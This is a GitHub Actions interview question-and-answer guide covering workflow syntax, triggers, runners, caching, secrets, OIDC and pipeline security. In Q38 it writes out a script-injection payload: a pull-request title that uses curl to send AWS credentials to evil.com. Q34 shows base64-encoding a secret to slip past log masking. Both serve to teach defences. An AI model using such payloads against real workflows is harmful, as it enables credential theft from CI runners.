# Interview Q&A — GitHub Actions

60 questions, end to end. Each one: **the concept first**, then the answer,
then a concrete scenario you can describe out loud.

Deep-dive material lives in [README.md](README.md),
[WORKFLOW-SYNTAX.md](WORKFLOW-SYNTAX.md),
[CONTEXTS-EXPRESSIONS.md](CONTEXTS-EXPRESSIONS.md),
[SECURITY.md](SECURITY.md), [EXAMPLES.md](EXAMPLES.md) and
[TROUBLESHOOTING.md](TROUBLESHOOTING.md).

---

## Section 1 — Fundamentals

**Q1. What is GitHub Actions?**

*Concept:* CI/CD is about running the same build, test and deploy steps on a
clean machine every time, automatically, instead of from someone's laptop.

GitHub Actions is a CI/CD platform built into GitHub. It runs automation on
GitHub-hosted (or self-hosted) machines in response to repository events. The
definition lives in YAML inside the repo, so the pipeline is versioned
alongside the code it builds.

*Scenario:* A team was deploying by running `npm run build && scp -r dist/ server:`
from whoever's laptop was free. Node versions differed between developers, so
"works on mine" was routine. Moving that to a workflow meant every build ran on
a fresh Ubuntu image with a pinned Node version — the inconsistency disappeared,
and `main` was provably green before anything shipped.

**Q2. Explain workflow, job, step, action and runner.**

*Concept:* These five words are the whole vocabulary; everything else is detail.

- **Workflow** — one YAML file in `.github/workflows/`. Declares *when* and *what*.
- **Job** — a named group of steps running on **one machine**. Jobs are parallel by default.
- **Runner** — the machine. GitHub-hosted (fresh VM per job) or self-hosted.
- **Step** — one unit inside a job: a shell command (`run:`) or a reusable action (`uses:`).
- **Action** — a packaged reusable step, e.g. `actions/checkout@v4`.

*Scenario:* A CI workflow triggered on push has three jobs — `lint`, `test`,
`build` — each on its own VM, all starting simultaneously. `test` has four
steps: checkout, setup-node, `npm ci`, `npm test`. Two of those are actions,
two are shell commands. A fourth job, `deploy`, has `needs: [lint, test, build]`
so it waits for all three.

**Q3. Where must workflow files live, and what happens if they're elsewhere?**

*Concept:* The path is a hard requirement, not a convention.

`.github/workflows/*.yml` — exactly that directory. A workflow anywhere else
is **silently ignored**: no error, no warning, nothing in the Actions tab.

*Scenario:* Someone put the file at `.github/ci.yml` and spent an afternoon
pushing commits wondering why nothing triggered. The same silence happens with
invalid YAML — GitHub can't parse it, so it doesn't appear at all. Both are why
`actionlint` before pushing is worth the 30 seconds.

**Q4. GitHub Actions vs Jenkins?**

*Concept:* The real difference is who operates the control plane.

| | Actions | Jenkins |
|---|---|---|
| Server | GitHub runs it | **You** run, patch, secure and back it up |
| Config | YAML in the repo | Jenkinsfile (Groovy), often plus UI config |
| Reuse | Marketplace actions | Plugins |
| Native repo access | PRs, releases, checks out of the box | Via plugins and webhooks |
| Cost | Free public; minutes on private | Free software, you pay for servers + ops time |

*Scenario:* Migrating a Jenkins pipeline, the biggest win wasn't syntax — it
was deleting the Jenkins master, its plugin upgrade treadmill and its
disaster-recovery runbook. The biggest loss was Groovy's flexibility: shared
libraries that did complex logic became several composite actions plus a
reusable workflow, which was more verbose but far easier for the team to read.

**Q5. Are jobs parallel or sequential? What about steps?**

*Concept:* Two different defaults, and mixing them up causes real bugs.

**Jobs run in parallel by default**, each on its own machine. **Steps run
sequentially** within one job, sharing that machine's filesystem. `needs:`
imposes order on jobs.

*Scenario:* A developer split `build` and `test` into two jobs and then
couldn't understand why `test` reported "no such file: dist/". The jobs ran on
different VMs simultaneously — `dist/` from the build machine simply didn't
exist on the test machine. Two fixes: put them in one job, or keep them
separate with `needs:` plus `upload-artifact`/`download-artifact`.

**Q6. What actually happens to the runner after a job finishes?**

*Concept:* Ephemerality is what makes CI reproducible — and what surprises
people.

The GitHub-hosted VM is **destroyed**. Nothing on disk survives: no installed
packages, no build output, no `/tmp` files. Only **artifacts** and **caches**
persist, and only because you explicitly upload them.

*Scenario:* A team installed a CLI tool in job A and called it in job B, which
failed with "command not found". Each job got a clean VM. They moved the
install into a composite action used by both jobs — repeating the install but
making each job self-contained, which is the correct model.

---

## Section 2 — Triggers and events

**Q7. What are the common triggers?**

*Concept:* `on:` is the entire trigger surface, and there are ~35 events.

`push`, `pull_request`, `schedule` (cron), `workflow_dispatch` (manual),
`release`, `workflow_call` (reusable), `workflow_run` (after another workflow),
`issues`, `issue_comment`, `repository_dispatch` (external API).

```yaml
on:
  push:
    branches: [main]
    paths: ['src/**']
  pull_request:
  schedule:
    - cron: '17 3 * * *'
  workflow_dispatch:
```

*Scenario:* A typical repo runs three workflows: CI on `pull_request` (fast,
every PR), release on `push` with `tags: ['v*']` (build and publish), and a
nightly `schedule` for dependency audits — with `workflow_dispatch` added to
the nightly so it can be tested without waiting a day.

**Q8. Workflows exist only on a `qa` branch, with `on: push: branches: [qa]`. Does a push to `qa` run? Does a push to `main`?**

*Concept:* For `push` and `pull_request`, GitHub reads `.github/workflows/`
**from the commit that triggered the event** — not from the default branch.
Two gates must both pass: the file must exist on the pushed branch, and the
`on:` filter must match.

**Push to `qa`: yes.** File exists there, filter matches.
**Push to `main`: no.** `main`'s commit has no workflow file — gate 1 fails,
and the file on `qa` is invisible to it.

*Scenario:* A team put CI on a `qa` branch and assumed it protected `main`
too. It didn't — `main` had no workflows at all, so merges went in
untested. Worse, the failure is **silent**: no red X, nothing in the Actions
tab. They fixed it by merging the workflow to `main` *and* widening the filter
to `branches: [main, qa]`. Note that merging the file alone wouldn't have
helped, because `branches: [qa]` still excludes `main`.

**Q9. Which events read only the default branch?**

*Concept:* Some events have no triggering branch, so GitHub has to pick one.

`schedule`, `workflow_dispatch`, `repository_dispatch` and `workflow_run` are
resolved from the **default branch only**.

*Scenario:* Someone added a nightly cron on a feature branch and waited two
days for it to fire. It never could. The related symptom for
`workflow_dispatch` is that the "Run workflow" button simply doesn't appear —
the workflow must be on the default branch to be dispatchable at all.

**Q10. `pull_request` vs `pull_request_target`?**

*Concept:* They differ in *whose code* runs and *whether secrets exist* — which
makes it a security question, not a convenience one.

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Code checked out | the **PR's** code | the **base branch's** code |
| Secrets (fork PRs) | **not available** | **available** |
| Risk | low | **high** |

*Scenario:* A repo used `pull_request_target` to label PRs, then someone added
`actions/checkout` with `ref: github.event.pull_request.head.sha` followed by
`npm install`. That runs an outside contributor's `postinstall` script with
full access to repository secrets. The rule: in a `pull_request_target`
workflow, never check out *and execute* PR code.

**Q11. Why do secrets come back empty on a fork's PR?**

*Concept:* Anyone can fork a public repo and open a PR. If secrets were
available, a PR that just printed them would be a trivial exfiltration.

For `pull_request` from a fork, `secrets.*` are empty and `GITHUB_TOKEN` is
read-only.

*Scenario:* An OSS project's CI failed on every external contribution because
it tried to upload coverage using a token. The fix was to make the
token-dependent step conditional —
`if: github.event.pull_request.head.repo.full_name == github.repository` — so
forks still ran the full test suite and only skipped the upload.

**Q12. How do you stop a workflow running twice on every PR commit?**

*Concept:* Defining both `push` and `pull_request` means a PR branch commit
matches both events.

Use `pull_request` alone for CI, or add a `concurrency` group.

*Scenario:* A repo was burning double its Actions minutes and showing two
identical check runs per commit. Removing the `push` trigger (keeping
`branches: [main]` on it only for post-merge builds) plus a concurrency group
halved the bill and cleaned up the checks list.

**Q13. Why doesn't a commit pushed by a workflow trigger another workflow?**

*Concept:* Infinite-loop protection.

Events caused by `GITHUB_TOKEN` do **not** trigger new workflow runs — by
design. Without it, a workflow that commits would trigger itself forever.

*Scenario:* A team had a workflow that auto-formatted code and pushed the
result, expecting CI to then run on that commit. It never did. They switched
that step to a PAT stored as a secret, which does trigger — and immediately had
to add a guard (`if: github.actor != 'github-actions[bot]'`) because they'd
re-enabled exactly the loop the restriction prevents.

**Q14. How reliable is `schedule`?**

*Concept:* Cron on a shared platform is best-effort, not real-time.

Always UTC. Delays of 5–30+ minutes are normal, worst at the top of the hour
when everyone schedules. Scheduled workflows are **auto-disabled after 60 days**
of repository inactivity.

*Scenario:* A job set to `0 * * * *` was consistently 20 minutes late.
Rescheduling to `17 * * * *` made it far more punctual — off-peak minutes are
much less contended. For anything requiring genuine precision, an external
scheduler calling `repository_dispatch` is the answer.

---

## Section 3 — Jobs, steps and runners

**Q15. What does `actions/checkout` do, and why is forgetting it the most common error?**

*Concept:* The runner is a bare machine. GitHub does not put your code on it.

`actions/checkout@v4` clones the repo at the triggering commit into
`$GITHUB_WORKSPACE`. Without it there is no code.

*Scenario:* A first workflow's very first `run: npm ci` failed with
"no such file or directory: package.json". Nothing was wrong with the project —
the repository simply wasn't there yet. It's almost always the first step of
the first job.

**Q16. When would you use `fetch-depth: 0`?**

*Concept:* `checkout` does a **shallow clone** (depth 1) for speed — one commit,
no history, no tags.

Set `fetch-depth: 0` when you need full history: semantic-release, changelog
generation, `git describe --tags`, or diffing against a base branch.

*Scenario:* A versioning tool that reads tags kept producing `v0.0.0` in CI
while working locally. The shallow clone had fetched no tags at all.
`fetch-depth: 0` fixed it, at the cost of a slower checkout on a large repo.

**Q17. GitHub-hosted vs self-hosted runners?**

*Concept:* The trade is convenience and isolation versus access and control.

**GitHub-hosted:** fresh isolated VM per job, big preinstalled toolset, no
maintenance, billed per minute on private repos. **Self-hosted:** your machine
— needed for private-network access, special hardware (GPU), or licensed
software; you own patching and security, and it is **not** destroyed after each
job.

*Scenario:* A team needed to deploy to an on-prem Kubernetes cluster with no
public endpoint, so a self-hosted runner inside that network was the only
option. Everything else stayed on GitHub-hosted runners, because putting CI for
a public repo on a self-hosted runner would let anyone run arbitrary code on
their hardware.

**Q18. Why never use self-hosted runners on a public repository?**

*Concept:* A PR is a request to execute arbitrary code.

On a public repo, anyone can open a PR whose workflow runs on your machine.
Unlike a hosted VM, it persists afterwards — so they can install a backdoor,
read local files or pivot into your network.

*Scenario:* This is a documented real-world attack pattern (crypto miners on
self-hosted runners of popular OSS projects). If it's unavoidable, use
`--ephemeral` runners in a disposable container, on an isolated network, with
no credentials on the host, and require approval for outside contributors'
workflow runs.

**Q19. Why set `timeout-minutes`?**

*Concept:* The default job timeout is **six hours**.

*Scenario:* A test command silently waited for interactive input. The job hung
for the full six hours before being killed — on a private repo that's 360
billable minutes for one stuck build, and it happened on every push until
someone noticed. `timeout-minutes: 15` turns a runaway into a fast, obvious
failure. Set it on every job.

**Q20. What's the difference between `continue-on-error` and `if: always()`?**

*Concept:* One changes how failure is *reported*; the other changes what *runs
next*.

`continue-on-error: true` — this step/job may fail without failing the
workflow. `if: always()` — run this step even though something earlier failed.

*Scenario:* A pipeline needed both. Flaky smoke tests got
`continue-on-error: true` so they'd report but not block the release, while the
log-upload step got `if: always()` so logs were captured precisely when tests
had failed. Also worth knowing: with `continue-on-error`, a step's `outcome` is
`failure` but its `conclusion` is `success` — test `outcome` to detect the real
result.

**Q21. What does `runs-on: ubuntu-latest` actually give you?**

*Concept:* Hosted runners come with a large, documented preinstalled toolset.

Roughly 4 CPU / 16 GB / 14 GB SSD, with git, docker, node, python, go, java,
`aws-cli`, `kubectl`, `terraform` and much more already present. `-latest`
**moves** between major OS versions over time.

*Scenario:* A pipeline broke overnight when `ubuntu-latest` moved from 22.04 to
24.04 and a system package name changed. Pinning `ubuntu-22.04` restored it
immediately and gave the team a controlled window to migrate. Pin for stability,
use `-latest` when you want to catch drift early.

---

## Section 4 — Passing data around

**Q22. How do you pass a value between steps?**

*Concept:* Each `run:` is a separate shell process, so variables don't survive.
GitHub provides files the runner reads between steps.

Write to `$GITHUB_OUTPUT` and read via the `steps` context. The step needs an `id`.

```yaml
- id: meta
  run: echo "tag=v1.2.3" >> "$GITHUB_OUTPUT"
- run: echo "Deploying ${{ steps.meta.outputs.tag }}"
```

*Scenario:* A workflow computed a Docker tag from the short SHA and date, then
used it in three later steps. Trying `TAG=$(...)` in one step and `$TAG` in the
next returned empty — different processes. `$GITHUB_OUTPUT` fixed it. (The old
`::set-output` syntax is deprecated and now disabled.)

**Q23. How do you pass a value between *jobs*?**

*Concept:* Jobs are on different machines, so step outputs aren't visible.

Declare `outputs:` on the producing job, consume via the `needs` context.

```yaml
jobs:
  build:
    outputs:
      tag: ${{ steps.meta.outputs.tag }}
  deploy:
    needs: build
    steps:
      - run: echo "${{ needs.build.outputs.tag }}"
```

*Scenario:* A build job produced an image tag and three deploy jobs (dev,
stage, prod) each consumed it, guaranteeing all three deployed the *same*
artifact rather than each recomputing a tag and drifting.

**Q24. Artifacts vs caches?**

*Concept:* They look similar and solve opposite problems.

| | Artifact | Cache |
|---|---|---|
| For | build output, reports, sharing between jobs | speeding up repeat runs |
| You depend on it | **yes** | **no** — must be safe to lose |
| Lifetime | 90 days (configurable) | 7 days unused, 10 GB/repo LRU |
| Mutable | new upload each run | **immutable per key** |

*Scenario:* A team cached `dist/` to pass it between jobs. It worked until a
cache eviction made the deploy job silently deploy a stale build. Artifacts are
correct for handoff; caches are only for things you can rebuild —
`node_modules`, `~/.m2`, pip wheels.

**Q25. Why does my cache never hit?**

*Concept:* Cache keys are **immutable** — an existing key is never overwritten.

If the key is static, the first run populates it and every later run restores
that stale copy. The key must include a hash of the dependency manifest.

```yaml
key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
restore-keys: ${{ runner.os }}-node-
```

*Scenario:* A repo used `key: node-modules` and wondered why new dependencies
never appeared. Adding `hashFiles` made the key change with the lockfile.
`restore-keys` gives a *partial* hit on a miss — you restore the previous
install and only download the delta. Also note caches are scoped by branch: a
feature branch can read `main`'s cache, but not vice versa.

**Q26. How do you set an environment variable for later steps?**

*Concept:* `env:` at workflow/job/step level is static. `$GITHUB_ENV` is for
values computed at runtime.

```yaml
- run: echo "VERSION=$(cat VERSION)" >> "$GITHUB_ENV"
- run: echo "$VERSION"     # available in LATER steps, not this one
```

*Scenario:* A developer wrote to `$GITHUB_ENV` and read `$VERSION` in the *same*
step, getting nothing. The file is processed *between* steps. Splitting it into
two steps fixed it.

---

## Section 5 — Matrix, conditions, expressions

**Q27. What is a matrix build?**

*Concept:* Run the same job across many combinations without duplicating YAML.

```yaml
strategy:
  fail-fast: false
  matrix:
    node: [18, 20, 22]
    os: [ubuntu-latest, windows-latest]
```

That's **6 parallel jobs**. `include` adds combinations or extra keys;
`exclude` removes them.

*Scenario:* A library supporting three Node versions on two OSes replaced six
near-identical jobs with one 6-line matrix. Crucially they set
`fail-fast: false` — the default cancels the remaining jobs on the first
failure, which hides whether a bug affects one version or all of them.

**Q28. How do you build a matrix dynamically?**

*Concept:* A matrix can come from JSON produced at runtime, via `fromJSON`.

*Scenario:* A monorepo with 30 services shouldn't rebuild all of them per PR. A
`discover` job diffed the changed paths and emitted a JSON array of affected
service directories; the `build` job used
`matrix: { dir: "${{ fromJSON(needs.discover.outputs.dirs) }}" }`. Typical PRs
went from 30 builds to 1–2.

**Q29. When do you need `${{ }}` and when not?**

*Concept:* `if:` is already an expression context; string interpolation is not.

```yaml
- run: echo "${{ github.sha }}"        # needed
  if: github.ref == 'refs/heads/main'  # not needed
  # but: if: ${{ !cancelled() }}       # braces REQUIRED — YAML reads ! as a tag
```

*Scenario:* `if: !cancelled()` is a YAML parse error, because `!` starts a tag.
Wrapping it in `${{ }}` is the one case where the braces are mandatory inside `if:`.

**Q30. Why is my `if:` condition always true?**

*Concept:* Every value from a context is a **string**. The string `'false'` is
truthy.

*Scenario:* A job used `if: needs.check.outputs.changed` where the output was
literally `"false"`. It ran every time. `if: needs.check.outputs.changed == 'true'`
fixed it. Always compare explicitly.

**Q31. `success()`, `failure()`, `always()`, `cancelled()` — and which to prefer?**

*Concept:* Status functions are only valid in `if:`. `success()` is the implicit
default.

*Scenario:* A cleanup step used `if: always()` and kept running for several
minutes after someone pressed Cancel, burning minutes. `if: ${{ !cancelled() }}`
runs on success and failure but honours cancellation — usually what you actually
want.

**Q32. What is `toJSON` useful for?**

*Concept:* Contexts are objects; you often need to see or serialise them.

*Scenario:* Debugging why a `paths` filter behaved unexpectedly, a step with
`run: echo '${{ toJSON(github.event) }}'` printed the entire webhook payload and
made the answer obvious in seconds. It's also how you pass structured data into
a matrix or an action input.

---

## Section 6 — Secrets, permissions, security

**Q33. Secrets vs variables?**

*Concept:* Both are repo/org/environment settings; only one is hidden.

`secrets` are masked in logs and write-only in the UI. `vars` are plain text,
readable — for region, URL, feature flags.

*Scenario:* A team stored an AWS region as a secret and then couldn't debug a
misconfiguration, because the logs showed `***` instead of `ap-south-1`. Moving
it to `vars` made logs readable while the actual credentials stayed secret.

**Q34. What does secret masking *not* protect against?**

*Concept:* Masking is literal string replacement in log output.

It misses **transformed** secrets (base64, URL-encoded, uppercased), secrets
split across lines, secrets written into artifacts, and secrets exfiltrated by
a malicious action.

*Scenario:* `run: echo "${{ secrets.TOKEN }}" | base64` prints the encoded token
in full — masking never sees the original string. For values you derive
yourself, emit `::add-mask::$VALUE` before using them.

**Q35. What is `GITHUB_TOKEN` and how should you scope it?**

*Concept:* An automatic, per-run token scoped to the repository, expiring when
the job ends. Its default permissions may be read/write on older repos.

```yaml
permissions:
  contents: read        # baseline; add only what fails
```

*Scenario:* A compromised third-party action in a workflow with default
read/write permissions could have pushed to `main` and created releases.
Setting `contents: read` at workflow level and granting
`packages: write`/`id-token: write` only on the jobs that need them limited what
any single compromised step could do.

**Q36. What is OIDC and why is it better than storing cloud keys?**

*Concept:* Instead of storing a long-lived credential, GitHub mints a
short-lived signed JWT; the cloud verifies it against GitHub's public keys and
returns temporary credentials.

```yaml
permissions:
  id-token: write        # required — without it you get a confusing failure
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
      aws-region: ap-south-1
```

*Scenario:* Replacing a stored `AWS_SECRET_ACCESS_KEY` with OIDC removed the
only long-lived credential in the repo — nothing left to leak or rotate, and
every deploy used credentials valid for about an hour. Same idea as IRSA for
EKS pods.

**Q37. What's the most dangerous OIDC misconfiguration?**

*Concept:* The IAM trust policy's `sub` condition is the entire security
boundary.

A wildcard like `repo:myorg/*` or `StringLike` matching any ref lets **any
branch — including a PR branch an outsider controls — assume your deploy role**.

*Scenario:* A trust policy used `"sub": "repo:myorg/myrepo:*"`. Anyone able to
push a branch could run a workflow that assumed the production deploy role. The
fix: `StringEquals` on `repo:myorg/myrepo:ref:refs/heads/main`, or better,
`repo:myorg/myrepo:environment:production` combined with an environment that
requires reviewer approval.

**Q38. What is script injection in Actions, and how do you prevent it?**

*Concept:* `${{ }}` is substituted into the shell script **as text, before it
runs**. Attacker-controlled text therefore becomes code.

```yaml
# VULNERABLE
- run: |
    echo "Title: ${{ github.event.pull_request.title }}"

# SAFE
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Title: $TITLE"
```

*Scenario:* A PR titled `a"; curl -d "@$HOME/.aws/credentials" evil.com; #`
exfiltrates credentials from the runner. Attacker-controlled fields include PR
and issue titles and bodies, comment bodies, commit messages, branch names and
author names. The fix is always the same: pass through `env:` so the value is
data, never code.

**Q39. Why pin actions to a commit SHA?**

*Concept:* An action is third-party code executing in your job with access to
your secrets. A git tag is mutable.

```yaml
uses: some-org/some-action@v3                              # tag — can be moved
uses: some-org/some-action@a1b2c3d4e5f6...                 # SHA — immutable
```

*Scenario:* In the March 2025 `tj-actions/changed-files` compromise, existing
tags were repointed at malicious code and thousands of repositories leaked
secrets into their logs. Repos pinned to SHAs were unaffected. Practical policy:
major tags acceptable for `actions/*`, full SHAs for everything else, with
Dependabot configured for `github-actions` to bump them.

**Q40. How do you require human approval before a production deploy?**

*Concept:* Environments are a deployment gate, not just a label.

```yaml
jobs:
  deploy:
    environment: production
```

Configured in Settings → Environments, an environment can require reviewers,
restrict which branches may deploy, add a wait timer, and hold its own secrets.

*Scenario:* Production credentials were repo-level secrets, so any workflow —
including one added in a PR — could reach them. Moving them to a `production`
environment with two required reviewers meant they were only injectable into a
job that a human had approved.

---

## Section 7 — Reuse

**Q41. Reusable workflow vs composite action?**

*Concept:* Different granularity, called at different levels.

| | Reusable workflow | Composite action |
|---|---|---|
| Contains | whole **jobs** | a sequence of **steps** |
| Called at | the **job** level | the **step** level |
| Can set `runs-on` | yes | no — inherits the caller's |
| Use for | a whole pipeline shared across repos | a repeated group of steps |

*Scenario:* Twelve repos shared the same build-test-scan pipeline → one
reusable workflow, called with `uses:` at job level. Within each repo, the
four-step "checkout + setup Node + restore cache + install" preamble appeared in
five jobs → one composite action. Different problems, different tools.

**Q42. What's the most common mistake writing a composite action?**

*Concept:* Composite actions require an explicit shell on every `run:`.

```yaml
runs:
  using: composite
  steps:
    - run: npm ci
      shell: bash        # MANDATORY — omitting it is a hard error
```

*Scenario:* The error message ("required property is missing: shell") isn't
obvious if you've only written workflow steps, where `shell:` is optional.

**Q43. How do secrets reach a reusable workflow?**

*Concept:* Reusable workflows don't inherit the caller's secrets by default —
they must be passed.

```yaml
jobs:
  ci:
    uses: ./.github/workflows/reusable.yml
    secrets:
      npm-token: ${{ secrets.NPM_TOKEN }}
      # or: secrets: inherit      # passes ALL of them
```

*Scenario:* A shared workflow failed with an empty token until secrets were
declared under `workflow_call.secrets` and passed explicitly. `secrets: inherit`
is convenient but hands the reusable workflow *every* secret — fine within one
org's trusted repos, not for anything third-party.

---

## Section 8 — Debugging, performance, cost

**Q44. A workflow doesn't run at all. How do you diagnose it?**

*Concept:* Almost all causes are "GitHub never even considered it".

Check in this order: (1) path is exactly `.github/workflows/`; (2) YAML is
valid — an unparseable workflow is silently ignored; (3) the `on:` filter
matches; (4) the file exists on the branch you pushed; (5) `schedule`/
`workflow_dispatch` need the default branch; (6) Actions enabled for the repo;
(7) scheduled workflow auto-disabled after 60 days idle; (8) the event was
caused by `GITHUB_TOKEN`.

*Scenario:* An indentation error made GitHub skip the file entirely — no error
anywhere. `actionlint` locally caught it in under a second. That silence is why
the checklist is ordered by "did GitHub even see this".

**Q45. How do you debug a failing workflow?**

*Concept:* Layered, cheapest first.

Set `ACTIONS_STEP_DEBUG=true` as a repo secret for verbose logs; dump contexts
with `toJSON`; inspect the machine (`env | sort`, `pwd`, `ls -la`, `df -h`);
reproduce locally with `act`; lint with `actionlint`; and as a last resort get
an interactive shell with `action-tmate`.

*Scenario:* A test passed locally and failed in CI. `env | sort` showed `CI=true`
was flipping the test framework into a stricter mode. Two minutes, no guessing.
Note `action-tmate` must never be used on a public repo — anyone reading the log
can connect to the runner.

**Q46. `act` — what is it good for and what are its limits?**

*Concept:* `act` runs workflows locally in Docker.

Good for YAML/logic errors without the push-wait-read cycle. Limits: different
container images than GitHub's runners, no real GitHub API, and services,
OIDC and some actions behave differently.

*Scenario:* Iterating on a matrix and a set of `if:` conditions, `act` cut the
loop from ~2 minutes per attempt to a few seconds. The final verification still
had to happen on GitHub.

**Q47. How do you make a pipeline faster?**

*Concept:* Attack wasted work first, then parallelism, then hardware.

Cache dependencies; use Docker layer caching (`cache-from: type=gha`); add
`concurrency` with `cancel-in-progress` to kill superseded runs; use `paths:`
filters to skip irrelevant runs; parallelise into jobs; skip heavy suites on
draft PRs.

*Scenario:* A 14-minute pipeline came down to about 4. The wins in order:
dependency caching (−3 min), Docker layer caching (−4 min), splitting lint/test/
build into parallel jobs (−3 min wall clock), and a `paths:` filter so doc-only
commits skipped it entirely.

**Q48. How does Actions billing work, and where does money leak?**

*Concept:* Public repos are free and unlimited. Private repos get a monthly
allowance then per-minute billing, with **multipliers: Linux ×1, Windows ×2,
macOS ×10**.

*Scenario:* A private repo's bill was dominated by a macOS job in a matrix that
didn't need macOS — 10 minutes there cost as much as 100 on Linux. Other common
leaks: no `timeout-minutes` (a hung job burns the 6-hour default), no
`concurrency` (five pushes run five pipelines), and no `paths:` filter (README
edits run the full suite).

**Q49. Why use `concurrency`, and when is `cancel-in-progress` wrong?**

*Concept:* It bounds how many runs of a group exist at once.

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

*Scenario:* Correct for CI — three quick pushes leave only the newest run.
**Wrong for deploys**: cancelling mid-deploy can leave a half-applied release.
For deploys, use a concurrency group *without* `cancel-in-progress`, so they
queue instead of racing.

**Q50. What are job summaries?**

*Concept:* `$GITHUB_STEP_SUMMARY` accepts Markdown and renders on the run page.

*Scenario:* Instead of asking people to scroll a 2,000-line log for test
results, a step wrote a Markdown table of pass/fail counts and coverage delta to
`$GITHUB_STEP_SUMMARY`. Reviewers read the outcome at a glance. Underused and
essentially free.

---

## Section 9 — Design and scenario questions

**Q51. Design a CI/CD pipeline for a containerised app on Kubernetes.**

> **On PR:** lint, unit tests (matrix over supported runtimes), build the image
> without pushing, run a vulnerability scan, comment results. Fast — target
> under five minutes — with `concurrency` cancelling superseded runs.
>
> **On merge to main:** rebuild, push to GHCR tagged with the git SHA (never
> `latest`), deploy to staging via OIDC, run smoke tests against staging.
>
> **On tag `v*`:** deploy to production, gated by a `production` environment
> with required reviewers. Deploy the **same SHA-tagged image** that passed
> staging — never rebuild for prod, or you're shipping something untested.
>
> **Throughout:** `permissions: contents: read` by default, OIDC instead of
> stored keys, third-party actions pinned to SHAs, `timeout-minutes` on every
> job, and `kubectl rollout status --timeout` so a deploy that doesn't become
> healthy fails loudly, with `if: failure()` triggering `rollout undo`.

**Q52. A monorepo with 20 services. How do you avoid rebuilding everything on every PR?**

> Two mechanisms together. First, `paths:` filters at the workflow level so
> unrelated changes don't trigger it at all. Second — and this is what actually
> scales — a `discover` job that diffs the changed paths against the base and
> emits a JSON array of affected services, feeding a **dynamic matrix** via
> `fromJSON`.
>
> `dorny/paths-filter` handles the diffing well. Add a rule that changes to
> shared libraries or the CI config itself expand to "build everything", so a
> library change can't sneak through untested. Typical PRs go from 20 builds to
> one or two; the occasional full run is correct rather than wasteful.

**Q53. Your team wants zero long-lived cloud credentials. How?**

> **OIDC everywhere.** Add GitHub's OIDC provider to the cloud account, create
> one role per deployment target, and give each a trust policy pinning the exact
> `sub` — `repo:org/repo:environment:production`, not a wildcard. Workflows get
> `permissions: id-token: write` and use the cloud's official login action.
>
> Then delete the stored keys, and enforce it: secret scanning with push
> protection so a key can't be committed, and periodic audits for any remaining
> `*_ACCESS_KEY` secrets. Gate the production role behind an environment with
> required reviewers, so even a compromised workflow can't assume it
> unilaterally. Same model as IRSA for EKS pods — federate identity rather than
> distribute credentials.

**Q54. How would you secure a public repo that accepts outside contributions?**

> Assume every PR is potentially hostile code.
>
> - **`pull_request`, never `pull_request_target`** for anything that builds or
>   tests contributor code. Forks get no secrets — design CI so tests pass
>   without them.
> - **Never self-hosted runners.**
> - **`permissions: contents: read`**, and require approval for first-time
>   contributors' workflow runs (a repo setting).
> - **No untrusted interpolation** — all event text through `env:`.
> - **Pin actions to SHAs.**
> - Steps needing secrets (coverage upload, deploy) guarded by
>   `if: github.event.pull_request.head.repo.full_name == github.repository`, or
>   moved to a separate `workflow_run` workflow that runs *after* CI, on the base
>   branch, without executing PR code.

**Q55. How do you test a change to a workflow itself?**

*Concept:* A workflow can't be validated by reading it — but the feedback loop
is slow.

> Layered: `actionlint` locally catches syntax, bad contexts and shell issues in
> a second. `act` runs it in Docker for logic. Then a real PR — because
> `pull_request` evaluates the **merge commit**, workflow edits inside a PR take
> effect for that PR's own runs, so you get genuine verification before merging.
> For `push`-only or `schedule` workflows, temporarily add `workflow_dispatch`
> and run it manually against a branch.

**Q56. `main` and `qa` branches, workflows only on `qa`. What's the risk?**

> `main` is **completely unprotected**. Pushes and merges to it run nothing —
> silently, with no failed check to notice. The team believes they have CI; they
> have CI on one branch.
>
> Fix: merge the workflow to `main` *and* widen the filter to
> `branches: [main, qa]` — merging alone doesn't help while the filter says
> `[qa]`. Then add a **branch protection rule** on `main` requiring that check
> to pass, which is what actually prevents merging broken code. And remember
> `schedule`/`workflow_dispatch` only ever resolve from the default branch.

**Q57. A deploy job intermittently fails with "resource is being modified by another operation". Why, and what fixes it?**

*Concept:* Two runs are deploying simultaneously.

> Two pushes land close together; both deploy jobs reach the cloud API at once
> and fight over the same resource. It's a classic missing-`concurrency` bug and
> it looks flaky because it depends on timing.
>
> Fix: a concurrency group on the deploy job — `group: deploy-production` —
> **without** `cancel-in-progress`, so the second run queues rather than
> cancelling a half-finished deployment. For Terraform specifically, state
> locking (DynamoDB) is the second layer that makes concurrent applies safe.

**Q58. How would you migrate a Jenkins pipeline to Actions?**

> Incrementally, never big-bang. Run both in parallel on the same commits and
> compare results until you trust the new one.
>
> Order: start with the simplest, highest-value stage (usually unit tests on
> PRs). Map Jenkins concepts — stages become jobs, `agent` becomes `runs-on`,
> shared libraries become composite actions or reusable workflows, credentials
> become secrets or, better, OIDC. Keep Jenkins for anything needing on-prem
> access until a self-hosted runner is ready. Move deploys last, because they're
> the riskiest and benefit most from having CI already proven.
>
> Expect the Groovy-to-YAML translation to be the awkward part: complex
> conditional logic that was a few lines of Groovy becomes either several jobs
> with `if:` conditions or a script the workflow calls.

**Q59. Your CI is green but production broke. What was missing?**

> CI proved the code compiles and unit tests pass. It didn't prove the thing
> that shipped works in the environment it shipped to.
>
> Typical gaps: no integration tests against real dependencies (add `services:`
> containers); building a *different* artifact for prod than the one tested in
> staging (promote the same SHA-tagged image); no post-deploy verification
> (`kubectl rollout status --timeout`, smoke tests against the deployed URL); no
> config validation, since config lives outside CI; and no automatic rollback
> (`if: failure()` → `rollout undo`).
>
> The principle: the pipeline should test the **artifact you will actually
> deploy**, in an environment resembling production, and verify health *after*
> deploying — not just before.

**Q60. What would you check in a review of someone's workflow file?**

> Roughly in order of how much damage each prevents:
>
> 1. `permissions:` declared and minimal — not the default read/write.
> 2. No untrusted `${{ }}` interpolated into `run:` — event text via `env:`.
> 3. Third-party actions pinned to SHAs.
> 4. Cloud auth via OIDC rather than stored keys, with a non-wildcard trust `sub`.
> 5. `timeout-minutes` on every job.
> 6. `concurrency` set — with `cancel-in-progress` on CI, without it on deploys.
> 7. No `pull_request_target` checking out and executing PR code.
> 8. Secrets not echoed, and not passed to actions that don't need them.
